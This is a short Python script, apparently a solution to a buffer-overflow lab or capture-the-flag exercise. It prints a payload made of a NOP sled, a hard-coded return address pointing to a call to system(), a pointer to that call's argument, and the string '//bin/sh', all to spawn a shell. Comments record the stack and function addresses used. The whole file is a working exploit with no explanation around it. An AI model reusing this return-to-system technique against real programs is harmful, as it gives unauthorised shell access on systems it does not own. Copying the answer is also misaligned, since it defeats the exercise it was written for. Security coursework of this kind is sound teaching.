#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\x90"*14+pack("<I", 0x080488ad)+pack("<I", 0xfffe9fd8)+b"//bin/sh") # get back to greetings and set up its argument

# buf start: 0xfffe9fc2
# ebp: 0xfffe9fcc
# call system: 0x080488ad
# pointer to arg of system(): 0xfffe9fd8 ($ebp+12)